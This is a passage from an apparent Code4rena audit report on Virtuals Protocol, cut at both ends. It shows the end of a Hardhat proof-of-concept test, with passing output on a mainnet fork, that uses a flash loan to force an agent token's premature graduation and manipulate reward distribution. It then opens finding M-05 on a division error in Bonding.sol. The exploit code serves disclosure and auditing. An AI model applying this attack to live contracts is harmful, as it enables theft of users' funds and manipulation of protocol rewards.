class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 4: Trade agent tokens for virtual tokens in Uniswap pair\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // We need to get uniswap pair and router\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const uniswapFactory = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;IUniswapV2Factory\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.UNISWAP_FACTORY\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const uniswapPair = await uniswapFactory.getPair(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      virtualToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenInfoAfterGraduation.agentToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Uniswap pair:\u0026quot;, uniswapPair);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const uniswapRouter = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;IUniswapV2Router02\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.UNISWAP_ROUTER\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Approve agent tokens to be spent by router\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(uniswapRouter.target, traderAgentTokenBalance);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Swap agent tokens for virtual tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await uniswapRouter\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .swapExactTokensForTokensSupportingFeeOnTransferTokens(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        traderAgentTokenBalance,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        0, // Accept any amount of tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        [tokenInfoAfterGraduation.agentToken, virtualToken.target],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        trader.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        Math.floor(Date.now() / 1000) + 60 * 20 // 20 minutes from now\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 5: Check balances after swap to verify flash loan repayment\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const finalVirtualBalance = await virtualToken.balanceOf(trader.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;Final trader VIRTUAL balance:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      formatEther(finalVirtualBalance)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Verify that trader has enough to repay flash loan\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Flash loan amount:\u0026quot;, formatEther(flashLoanAmount));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;Difference:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ((flashLoanAmount - finalVirtualBalance) * 100n) / flashLoanAmount\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // A typical flash loan would require the balance to be \u0026gt;= the loan amount\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Due to fees and taxes, there should be a small difference\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 6: Check if the uniswap LP tokens are automatically staked in veToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Since this is the first agent created, its ID should be 1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const virtualId = 1;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const lpInfo = await agentNft.virtualLP(virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Virtual ID:\u0026quot;, virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;LP token:\u0026quot;, lpInfo.pool);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;veToken:\u0026quot;, lpInfo.veToken);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Check LP staking\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const veToken = await ethers.getContractAt(\u0026quot;AgentVeToken\u0026quot;, lpInfo.veToken);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const founderVeTokenBalance = await veToken.balanceOf(founder.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;founder veToken balance:\u0026quot;, formatEther(founderVeTokenBalance));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 7: Delegate to self to be eligible for rewards\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (founderVeTokenBalance \u0026gt; 0) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await veToken.connect(founder).delegate(founder.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      console.log(\u0026quot;Trader delegated to self\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 8: Distribute rewards and verify allocation\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Deploy rewards contract to verify reward allocation\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Setting up rewards contract for validation...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const rewardsFactory = await ethers.getContractFactory(\u0026quot;AgentRewardV3\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const rewards = await upgrades.deployProxy(rewardsFactory, [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      virtualToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      agentNft.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        protocolShares: 1000, // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        stakerShares: 9000, // 90%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      },\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await rewards.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Grant governance role to deployer\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await rewards.grantRole(await rewards.GOV_ROLE(), deployer.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Check LP value (should be based on VIRTUAL token in the pool)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const lpValue = await rewards.getLPValue(virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;LP value for virtualId 1:\u0026quot;, formatEther(lpValue));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Mint some VIRTUAL tokens to distribute as rewards\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const rewardAmount = parseEther(\u0026quot;10000\u0026quot;); // 10,000 VIRTUAL tokens as rewards\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(deployer.address, rewardAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.approve(rewards.target, rewardAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Distribute rewards\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await rewards.distributeRewards(rewardAmount, [virtualId], false);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Rewards distributed\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Check rewards allocation\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentRewardCount = await rewards.agentRewardCount(virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Agent reward count:\u0026quot;, agentRewardCount.toString());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Verify rewards were allocated\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(agentRewardCount).to.be.gt(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Access the first agent reward directly\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentReward = await rewards.getAgentReward(virtualId, 0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Agent reward details:\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;- Staker Amount:\u0026quot;, formatEther(agentReward.stakerAmount));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;- Validator Amount:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      formatEther(agentReward.validatorAmount)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;- Total Staked:\u0026quot;, formatEther(agentReward.totalStaked));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Both stakers and validators receive rewards from the manipulated LP value\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(agentReward.stakerAmount).to.be.gt(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(agentReward.validatorAmount).to.be.gt(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003cp\u003eSee test results:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"47\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Bonding\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eToken created: 0xeC05bC6e8B4DEc3299fA25BDFBd44A43Db415995\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eFlash loan acquired: 100000.0 VIRTUAL\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eInitial balances:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e- Trader VIRTUAL: 100000.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e- Pair VIRTUAL: 100.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e- Founder CAT: 32258064.516129032258064517\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAgent token created: 0x08BD7109ed9c72771A4e494D155e2F31C65205D9\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTrader CAT balance: 889001778.003556007112014224\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTrader agent token balance after unwrap: 889001778.003556007112014224\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eUniswap pair: 0x23457Bea4813642d6f3d4BFDDD461d7f738639cF\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eFinal trader VIRTUAL balance: 97209.656939017097749081\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eFlash loan amount: 100000.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eDifference: 2n\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVirtual ID: 1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eLP token: 0x23457Bea4813642d6f3d4BFDDD461d7f738639cF\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eveToken: 0x75D4c71311994307616350d38f2E832A57440da5\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003efounder veToken balance: 1662461.882480317200970858\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTrader delegated to self\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSetting up rewards contract for validation...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eLP value for virtualId 1: 2890.343060982902250919\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eRewards distributed\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAgent reward count: 1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAgent reward details:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e- Staker Amount: 9000.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e- Validator Amount: 1000.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e- Total Staked: 1662461.882480317200970858\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ✔ flash loan attack force premature graduation, manipulating rewards (1053ms)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e1 passing (1s)\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNote: in order to run tests, I forked eth mainnet in hardhat network and used mainnet \u003ccode\u003eUNISWAP_ROUTER\u003c/code\u003e and \u003ccode\u003eUNISWAP_FACTORY\u003c/code\u003e addresses. I also tweaked \u003ccode\u003e.env\u003c/code\u003e and hardhat config accordingly. \u003c/p\u003e\n\u003cp\u003eRun test: npx hardhat test \u003ccode\u003etest/bonding.js\u003c/code\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-05-division-in-bondingsol_opentradingonuniswap-results-in-an-incorrect-lpsupply-higher-vaultsupply-and-dust-agenttokens-getting-locked-in-fpair\" style=\"position:relative;\"\u003e\u003ca href=\"#m-05-division-in-bondingsol_opentradingonuniswap-results-in-an-incorrect-lpsupply-higher-vaultsupply-and-dust-agenttokens-getting-locked-in-fpair\" aria-label=\"m 05 division in bondingsol_opentradingonuniswap results in an incorrect lpsupply higher vaultsupply and dust agenttokens getting locked in fpair permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-13\"\u003e[M-05] Division in \u003ccode\u003eBonding.sol._openTradingOnUniswap()\u003c/code\u003e results in an incorrect \u003ccode\u003elpSupply\u003c/code\u003e, higher \u003ccode\u003evaultSupply\u003c/code\u003e, and dust \u003ccode\u003eAgentTokens\u003c/code\u003e getting locked in \u003ccode\u003eFPair\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-312\"\u003eBowTiedOriole\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-555\"\u003eYouCrossTheLineAlfie\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eWhen a Prototype Agent graduates to a Sentient Agent, agent tokens are minted to the \u003ccode\u003eFPair\u003c/code\u003e contract. Users are then able to call \u003ccode\u003eBonding.unwrapToken()\u003c/code\u003e to claim their agent tokens.\u003c/p\u003e\n\u003cp\u003eUpon graduation, the Bonding contract will divide the token supply as well as the \u003ccode\u003etokenBalance\u003c/code\u003e by \u003ccode\u003e10 ** 18\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/Bonding.sol#L390-L395\"\u003eBonding.sol#L390-L395\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentFactoryV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan 